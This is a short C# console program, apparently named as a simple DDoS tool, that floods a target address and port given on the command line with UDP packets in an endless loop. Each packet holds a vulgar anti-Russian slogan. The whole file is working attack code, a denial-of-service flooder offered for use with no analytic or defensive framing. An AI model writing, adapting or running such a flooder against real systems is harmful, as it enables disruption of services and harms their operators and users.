using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleDDoSerhii
{
    class Program
    {
        static int Main(string[] args)
        {
            try
            {
                if (args.Length == 0)
                {
                    Console.WriteLine("Empty arguments");
                    return 1;
                }
                
                var endPointAddress = args[0];
                var destinationPort = string.IsNullOrEmpty(args[1]) ? 53 : int.Parse(args[1]);
                var total = 0;
                
                while (true)
                {
                    Up(endPointAddress, destinationPort, total);
                    Console.WriteLine($"Sent to endpoint {endPointAddress}:{destinationPort} Total packets: {total}");
                    total++;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                throw;
            }
        }

        private static void Up(string address, int port, int total)
        {
            var data = Encoding.UTF8.GetBytes("russkiy voenniy korabl - idi na xuy");
            var client = new UdpClient();
            client.SendAsync(data, data.Length, address, port);
        }
    }
}